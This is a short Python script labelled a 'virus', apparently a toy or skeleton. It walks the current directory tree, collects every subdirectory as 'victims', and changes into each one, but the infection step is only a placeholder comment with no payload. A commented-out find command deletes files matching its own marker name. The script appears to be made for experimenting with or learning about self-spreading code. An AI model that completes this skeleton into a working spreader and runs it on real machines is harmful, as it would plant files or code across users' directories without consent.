# find . -type f -name '*plague.virus*' -delete
import os
import subprocess as sp
# from termcolor import colored as tcc

def transmit_virion():
    '''
    Recursively searches the current directory tree and
    returns a list of dirs it finds.

    intended usage:
        victims = transmit_virion()
        infect(victims)

    returns: list of dirs in current tree
    return type: list
    '''
    dirs_to_infect = list()
    for root, dirs, fils in os.walk(os.getcwd()):
        for di in dirs:
            dirs_to_infect.append(os.path.join(root, di))
    return dirs_to_infect

def infect(victims):
    '''
    Accepts list of directories to infect, goes to each dir in list
    and creates a python file.

    input: list
    returns: virus
    '''
    for victim in victims:
        os.chdir(victim)
        # create files, run more scripts, etc.



if __name__ == "__main__":

    ## ~ VIRUS ~ ##
    victims = transmit_virion()
    infect(victims)

